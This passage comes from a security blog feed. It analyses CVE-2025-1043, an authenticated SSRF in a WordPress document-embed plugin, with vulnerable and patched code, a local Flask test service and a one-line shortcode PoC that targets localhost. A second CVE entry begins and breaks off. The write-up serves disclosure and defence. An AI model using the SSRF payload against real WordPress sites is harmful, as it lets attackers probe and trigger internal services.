1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, &lt;code&gt;embed_shortcode()&lt;/code&gt; performs an HTTP HEAD request using &lt;code&gt;wp_remote_head()&lt;/code&gt; with the &lt;code&gt;url&lt;/code&gt; value taken directly from &lt;code&gt;$shortcode_atts[&#39;url&#39;]&lt;/code&gt;. Because there is no validation, filtering, or scope limitation for the URL, an attacker can supply an arbitrary URL — leading to requests being sent to local services and causing &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function embed_shortcode( $atts ) {&#xA;    ...&#xA;    $show             = false;&#xA;    $shortcode_atts   = shortcode_atts(&#xA;        array(&#xA;            &amp;#39;url&amp;#39;      =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;drive&amp;#39;    =&amp;gt; &amp;#39;&amp;#39;,&#xA;            &amp;#39;viewer&amp;#39;   =&amp;gt; $default_provider,&#xA;            &amp;#39;download&amp;#39; =&amp;gt; $default_download,&#xA;            ...&#xA;        ),&#xA;        $atts&#xA;    );&#xA;&#xA;    if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) ) :&#xA;        ...&#xA;        if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;            if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;                $show = true;&#xA;            } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;                $show = true;&#xA;            }&#xA;        }&#xA;        $url = esc_url( $shortcode_atts[&amp;#39;url&amp;#39;], array( &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ) );&#xA;        if ( $show ) {&#xA;            $filedata = wp_safe_remote_head( $shortcode_atts[&amp;#39;url&amp;#39;] );&#xA;            ...&#xA;        }&#xA;    ...&#xA;    return $embed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch replaces &lt;code&gt;wp_remote_head()&lt;/code&gt; with &lt;strong&gt;&lt;code&gt;wp_safe_remote_head()&lt;/code&gt;&lt;/strong&gt;, which adds safety checks to &lt;strong&gt;prevent access to internal/private/loopback/link-local addresses&lt;/strong&gt;, thereby mitigating SSRF risk.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To reach the &lt;code&gt;wp_remote_head( $shortcode_atts[&#39;url&#39;] )&lt;/code&gt; call in &lt;code&gt;embed_shortcode()&lt;/code&gt;, an attacker must bypass the following checks:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt; must be set and not empty&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $shortcode_atts[&amp;#39;url&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $shortcode_atts[&amp;#39;url&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;$show&lt;/code&gt; must be set to true before entering the HEAD call&#xA;&lt;code&gt;$show&lt;/code&gt; defaults to &lt;code&gt;false&lt;/code&gt;. It becomes &lt;code&gt;true&lt;/code&gt; only when &lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&#39;viewer&#39;] ) )&lt;/code&gt; returns &lt;code&gt;true&lt;/code&gt; and one of the following is satisfied:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $this-&amp;gt;allowdownload( $shortcode_atts[&amp;#39;viewer&amp;#39;] ) ) {&#xA;    if ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;alluser&amp;#39; || $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;all&amp;#39; ) {&#xA;        $show = true;&#xA;    } elseif ( $shortcode_atts[&amp;#39;download&amp;#39;] === &amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in() ) {&#xA;        $show = true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; equals &lt;code&gt;&#39;alluser&#39;&lt;/code&gt; or &lt;code&gt;&#39;all&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;download&lt;/code&gt; equals &lt;code&gt;&#39;logged&#39;&lt;/code&gt; and &lt;code&gt;is_user_logged_in()&lt;/code&gt; returns &lt;code&gt;true&lt;/code&gt; (i.e., the user is logged in).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allowdownload( $provider ) {&#xA;    $blacklist = array( &amp;#39;drive&amp;#39;, &amp;#39;box&amp;#39; );&#xA;    if ( in_array( $provider, $blacklist, true ) ) {&#xA;        return false;&#xA;    } else {&#xA;        return true;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;allowdownload()&lt;/code&gt; returns &lt;code&gt;true&lt;/code&gt; if the &lt;code&gt;$provider&lt;/code&gt; (&lt;code&gt;$shortcode_atts[&#39;viewer&#39;]&lt;/code&gt;) is not present in the &lt;code&gt;$blacklist&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Because the SSRF is performed via HTTP HEAD, the &lt;strong&gt;response body is not returned&lt;/strong&gt;, but metadata (Content-Type, Content-Length) can still be disclosed and internal endpoints can be probed. If an endpoint does not distinguish by HTTP method, state-changing actions may be triggered.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;&lt;code&gt;embed_shortcode()&lt;/code&gt; is registered as the shortcode callback:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;embeddoc&amp;#39;, array( $this, &amp;#39;embed_shortcode&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Shortcode: [embeddoc url=...]&amp;#34;] --&amp;gt; B[&amp;#34;embed_shortcode($atts)&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;isset($shortcode_atts[&amp;#39;url&amp;#39;]) &amp;amp;&amp;amp; !empty(...)?&amp;#34;}&#xA;C -- Yes --&amp;gt; D{&amp;#34;$this-&amp;gt;allowdownload($shortcode_atts[&amp;#39;viewer&amp;#39;])?&amp;#34;}&#xA;C -- No --&amp;gt; End1[No request]&#xA;D -- Yes --&amp;gt; E{&amp;#34;download == &amp;#39;all&amp;#39;|&amp;#39;alluser&amp;#39; OR (download==&amp;#39;logged&amp;#39; &amp;amp;&amp;amp; is_user_logged_in())?&amp;#34;}&#xA;D -- No --&amp;gt; End2[No request]&#xA;E -- Yes --&amp;gt; F[&amp;#34;wp_remote_head($shortcode_atts[&amp;#39;url&amp;#39;]) ← SSRF sink&amp;#34;]&#xA;E -- No --&amp;gt; End3[No request]&#xA;F --&amp;gt; G[&amp;#34;Return to client&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service in Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Log in with a Contributor account&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Create a post with the shortcode&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[embeddoc url=http://localhost:8001/delete?id=1 download=all]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#34; title=&#34;HEAD request to local service&#34; data-thumbnail=&#34;/posts/2025-11-02-cve-2025-1043/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;HEAD request to local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-02-cve-2025-1043/result.png&#39; alt=&#34;Result&#34; height=&#34;283&#34; width=&#34;587&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;HEAD request to local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-1043 is an SSRF due to the plugin calling &lt;code&gt;wp_remote_head()&lt;/code&gt; with a URL from the shortcode without validation. Although the request is a &lt;code&gt;HEAD&lt;/code&gt; (no body), it can still disclose metadata and probe internal services or, via redirects or method-agnostic endpoints, cause state changes. The patch (v2.7.6) uses &lt;code&gt;esc_url_raw()&lt;/code&gt; + &lt;code&gt;wp_safe_remote_head()&lt;/code&gt; to mitigate the risk.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cause: missing filtering/whitelist of URLs before making server-side HTTP calls.&lt;/li&gt;&#xA;&lt;li&gt;Impact: metadata leak, internal discovery, possible chaining (redirect → GET, method-agnostic endpoints).&lt;/li&gt;&#xA;&lt;li&gt;Fix: update to &lt;strong&gt;v2.7.6&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Short recommendations: use &lt;code&gt;wp_safe_remote_*&lt;/code&gt;, &lt;code&gt;esc_url_raw()&lt;/code&gt;/whitelist, disable redirects when only headers are needed, and limit user privileges.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-any-document/vulnerability/wordpress-embed-any-document-embed-pdf-word-powerpoint-and-excel-files-plugin-2-7-5-authenticated-contributor-blind-server-side-request-forgery-via-embeddoc-shortcode-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin &amp;lt;= 2.7.5 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52713 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-01-cve-2025-52713/</link>
      <pubDate>Sat, 01 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-01-cve-2025-52713/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-01-cve-2025-52713/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;A &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; vulnerability in the &lt;strong&gt;BoldGrid Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt; plugin allows an attacker to perform &lt;strong&gt;forged requests from the server&lt;/strong&gt;.&#xA;This issue affects the &lt;strong&gt;Post and Page Builder by BoldGrid – Visual Drag and Drop Editor&lt;/strong&gt; plugin from an unknown version up to &lt;strong&gt;1.27.8&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52713&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52713&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.27.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.27.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/post-and-page-builder/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Post and Page Builder by BoldGrid – Visual Drag and Drop Editor Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    